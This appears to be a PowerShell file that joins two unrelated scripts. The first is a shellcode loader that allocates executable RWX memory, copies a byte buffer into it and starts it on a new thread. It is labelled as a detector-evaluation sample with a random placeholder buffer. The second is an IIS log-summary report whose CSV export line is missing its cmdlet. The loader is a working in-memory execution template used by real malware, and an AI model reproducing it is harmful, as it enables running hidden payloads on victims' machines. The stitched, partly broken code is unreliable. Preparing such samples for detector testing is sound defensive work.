<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class Win32Api
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x33, 0x2d, 0xee, 0x61, 0x51, 0x3d, 0x3d, 0xba, 0xad, 0x86, 0x62, 0x4d, 0x87, 0x3f, 0xa7, 0x9a,
        0x43, 0x90, 0xb4, 0x84, 0x58, 0x19, 0x2d, 0xf4, 0x38, 0x79, 0x91, 0xed, 0x77, 0xf7, 0x6f, 0x4a,
        0xe9, 0xa3, 0xeb, 0x48, 0x51, 0x21, 0x3b, 0x41, 0xcd, 0x67, 0x63, 0x10, 0x04, 0x04, 0x99, 0x8c,
        0x1c, 0x8a, 0xf4, 0x36, 0x20, 0x8f, 0x28, 0xdf, 0x09, 0x33, 0x26, 0x73, 0x33, 0x6e, 0x53, 0xec,
        0x4f, 0x0f, 0x2b, 0xbe, 0x88, 0xa9, 0x6a, 0xe8, 0x9c, 0x81, 0x97, 0x4b, 0x9d, 0xdc, 0xa1, 0x3f,
        0x1e, 0x1a, 0xaa, 0x8c, 0xd3, 0x1b, 0xfd, 0x5f, 0x40, 0x7b, 0xc8, 0x78, 0x64, 0xea, 0xe0, 0x09,
        0x9e, 0x44, 0x21, 0x41, 0x58, 0xdf, 0x3e, 0xdd, 0xbc, 0x75, 0x4b, 0x94, 0xc7, 0x42, 0x48, 0x2d,
        0x0d, 0x92, 0x6c, 0xa8, 0xbf, 0x53, 0x46, 0xf4, 0xee, 0xaa, 0x3c, 0x88, 0x93, 0xae, 0x45, 0x13,
        0x82, 0xf3, 0x7d, 0x14, 0x78, 0x4d, 0xf8, 0xe1, 0xa0, 0xaf, 0xf0, 0xb1, 0xe6, 0xf2, 0xca, 0xf3,
        0xe6, 0xb9, 0x32, 0x75, 0x3d, 0x12, 0xd0, 0xfb, 0x05, 0xd8, 0x67, 0x21, 0xa6, 0x31, 0x3b, 0x71,
        0x52, 0xa9, 0x41, 0x17, 0xdb, 0x73, 0x4a, 0x3e, 0x92, 0x02, 0xa5, 0xe3, 0xaf, 0xb2, 0xd8, 0xf2,
        0x4a, 0x60, 0x78, 0x70, 0x55, 0x35, 0xab, 0xf0, 0x53, 0x19, 0xde, 0x0d, 0xc0, 0x21, 0x73, 0x7b,
        0xb6, 0xf2, 0xb5, 0xf8, 0xc9, 0xb9, 0x2e, 0xdd, 0x01, 0x51, 0x88, 0x47, 0x4e, 0x1b, 0x12, 0xaf,
        0x1b, 0xaa, 0xda, 0x6f, 0xe9, 0x2d, 0x12, 0x6f, 0x98, 0x54, 0xd2, 0xdc, 0x9b, 0xf5, 0xbc, 0xcd,
        0x32, 0x03, 0x6d, 0x7f, 0xe7, 0xdc, 0x99, 0x87, 0xb6, 0x60, 0xe0, 0xcc, 0x35, 0xac, 0x88, 0x8a,
        0x5e, 0x74, 0x12, 0xbd, 0x6f, 0x4f, 0xee, 0x42, 0x52, 0x9b, 0x04, 0x66, 0x09, 0xc7, 0x34, 0x28,
        0x4e, 0x6e, 0x7f, 0xba, 0xcb, 0x48, 0x92, 0x2f, 0x33, 0x01, 0xf2, 0x06, 0x31, 0x61, 0xa3, 0x72,
        0x28, 0xcf, 0x07, 0x4e, 0x03, 0xf8, 0x7a, 0x84, 0x95, 0x90, 0xc3, 0xe6, 0x85, 0x3b, 0x9c, 0xbe,
        0x69, 0x0b, 0xa9, 0x8e, 0x33, 0x71, 0x26, 0x9a, 0x1b, 0x3d, 0xde, 0x51, 0x55, 0xc8, 0x7d, 0x1f,
        0xdf, 0x6b, 0xef, 0x9d, 0x8b, 0x6c, 0x70, 0x5a, 0x6c, 0x52, 0xbe, 0xb5, 0xc1, 0xd9, 0x8e, 0xcd,
        0x66, 0x86, 0xb6, 0x41, 0x14, 0xce, 0x96, 0x3f, 0xb9, 0x44, 0xba, 0xd7, 0xe3, 0x15, 0xc1, 0x6b,
        0x68, 0x49, 0x5b, 0x8d, 0x5a, 0x60, 0x56, 0xa5, 0x34, 0x78, 0x29, 0xec, 0x02, 0xb8, 0x88, 0x6a,
        0x4f, 0xed, 0xda, 0x3b, 0xf0, 0xd4, 0xb9, 0x8a, 0xe3, 0xb4, 0x76, 0x52, 0x35, 0xc3, 0x9e, 0xee,
        0x73, 0xcb, 0xcd, 0xe0, 0x5b, 0x54, 0x70, 0xcb, 0x3b, 0xb9, 0xbd, 0x77, 0x27, 0xac, 0xee, 0x24,
        0x68, 0xdd, 0x42, 0x70, 0x9a, 0x81, 0x29, 0xb1, 0xa9
    )

    $MemoryHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($MemoryHandle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][Win32Api]::WaitForSingleObject($Thread, 2602)
    [void][Win32Api]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
#Requires -Version 5.1
$LogRoot = "C:\inetpub\logs\LogFiles\W3SVC1"
$Days = 7
$TopN = 5
$OutputPath = "D:\Ops\reports\iis-top-2024-02-06.csv"
$HtmlPath = 'C:\Reports\iis-2024-02-06.html'
$ProgressPreference = 'SilentlyContinue'
$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$topUrls |
    -Path $OutputPath `
    -NoTypeInformation `
    -Encoding UTF8

Write-Host ("Requests: {0} | Errors: {1} | Traffic: {2} MB" -f $totalRequests, @($errorEntries).Count, $totalMB) -ForegroundColor Cyan
$byStatus | Format-Table -AutoSize

$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f4f4f4; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$topUrls | ConvertTo-Html -Title 'Top URLs' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8
